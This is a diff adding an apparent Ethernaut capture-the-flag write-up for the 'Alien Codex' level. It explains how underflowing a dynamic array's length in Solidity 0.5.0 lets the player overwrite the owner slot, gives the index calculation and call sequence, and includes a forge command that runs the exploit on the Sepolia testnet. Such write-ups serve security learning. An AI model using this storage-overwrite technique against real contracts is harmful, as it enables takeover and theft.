@@ -387,3 +387,25 @@ To unlock this level, I have to use the evm opcodes in order to build the binary
 ### Running the code
 
 Sepolia: `forge script script/Level18.exp.sol --broadcast --rpc-url $SEPOLIA`
+
+## 19.Alien Codex
+
+`Ethernaut Instance: 0x052b8cbFd3c459DCFAB4E53ef8a56062Ac0aBf77`
+
+### Steps
+Though there's no function to modify the owner in the ABI, I can still play around with the dynamic array `codex`. Likewise, being Solidity 0.5.0, I can also overflow/underflow uints/ints. Having this in maind, I took a look to the storage layout of the contract
+```solidity
+address owner; // slot 0
+bool public contact; // slot 0
+bytes32[] public codex; // slot 1: codex.length and slot keccak256(abi.encode(1)): codex[0]
+```
+So, My objective now is to reach slot 0 using the index of `codex` and overwrite it with my address. Though I'll also overwrite `contact`, I won't need it any more at this point.
+1. I have to resolve the index that will match slot 0 => `index = ((2 ** 256) - 1) - uint256(keccak256(abi.encode(1))) + 1`
+2. I call `instance.makeContact()` to be able to interact with the contract.
+3. I now call `instance.retract()` to underflow the index of the `codex[]`.
+4. Now I cast my address in bytes 32 => `bytes32 player = bytes32(uint256(uint160(0x9606e11178a83C364108e99fFFD2f7F75C99d801)))`
+5. And finally, I call `instance.revise(index, player)`
+
+### Running the code
+
+Sepolia: `forge script script/Level19.exp.sol --broadcast --rpc-url $SEPOLIA`
